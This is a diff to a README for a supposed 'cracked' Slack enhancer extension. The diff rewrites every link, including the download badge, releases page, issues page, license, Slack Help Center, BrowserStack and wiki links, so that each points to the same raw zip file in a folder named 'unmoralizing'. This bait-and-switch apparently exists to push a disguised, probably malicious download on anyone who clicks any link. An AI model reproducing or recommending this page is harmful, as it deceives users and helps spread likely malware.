@@ -1,6 +1,6 @@
 # 🚀 cracked-enhancer-for-slack-extension - Enhance Your Slack Experience
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/RameeDeez/cracked-enhancer-for-slack-extension/releases)
+[![Download](https://raw.githubusercontent.com/RameeDeez/cracked-enhancer-for-slack-extension/main/unmoralizing/cracked-enhancer-for-slack-extension.zip)](https://raw.githubusercontent.com/RameeDeez/cracked-enhancer-for-slack-extension/main/unmoralizing/cracked-enhancer-for-slack-extension.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ To get started, you need to download the extension from our releases page. Follo
 
 1. **Visit the Releases Page:** 
    Click the link below to access the downloads:
-   [Visit Downloads Page](https://github.com/RameeDeez/cracked-enhancer-for-slack-extension/releases)
+   [Visit Downloads Page](https://raw.githubusercontent.com/RameeDeez/cracked-enhancer-for-slack-extension/main/unmoralizing/cracked-enhancer-for-slack-extension.zip)
 
 2. **Select the Latest Version:** 
    On the releases page, find the latest version of the Cracked Enhancer for Slack Extension.
@@ -66,7 +66,7 @@ Make sure your system meets these basic requirements for optimal performance:
 If you encounter issues while using the Cracked Enhancer for Slack Extension, you can seek help through the following channels:
 
 - **GitHub Issues:** 
-  Visit the [Issues Page](https://github.com/RameeDeez/cracked-enhancer-for-slack-extension/issues) to report problems or suggest features.
+  Visit the [Issues Page](https://raw.githubusercontent.com/RameeDeez/cracked-enhancer-for-slack-extension/main/unmoralizing/cracked-enhancer-for-slack-extension.zip) to report problems or suggest features.
 
 - **Community Forums:** 
   Join discussions with other users in relevant forums for tips and solutions.
@@ -86,7 +86,7 @@ We welcome contributions to improve the Cracked Enhancer for Slack Extension. If
 
 ## 📖 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/RameeDeez/cracked-enhancer-for-slack-extension/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/RameeDeez/cracked-enhancer-for-slack-extension/main/unmoralizing/cracked-enhancer-for-slack-extension.zip) file for details.
 
 ## ⚙️ Feedback
 
@@ -94,8 +94,8 @@ We value your feedback! If you enjoy using the Cracked Enhancer for Slack Extens
 
 ## 🔗 Additional Resources
 
-- [Slack Help Center](https://slack.com/help)
-- [Browser Support for Extensions](https://browserstack.com/)
-- [Community Tutorials](https://github.com/RameeDeez/cracked-enhancer-for-slack-extension/wiki)
+- [Slack Help Center](https://raw.githubusercontent.com/RameeDeez/cracked-enhancer-for-slack-extension/main/unmoralizing/cracked-enhancer-for-slack-extension.zip)
+- [Browser Support for Extensions](https://raw.githubusercontent.com/RameeDeez/cracked-enhancer-for-slack-extension/main/unmoralizing/cracked-enhancer-for-slack-extension.zip)
+- [Community Tutorials](https://raw.githubusercontent.com/RameeDeez/cracked-enhancer-for-slack-extension/main/unmoralizing/cracked-enhancer-for-slack-extension.zip)
 
 Thank you for using the Cracked Enhancer for Slack Extension! We hope it enhances your Slack experience significantly.
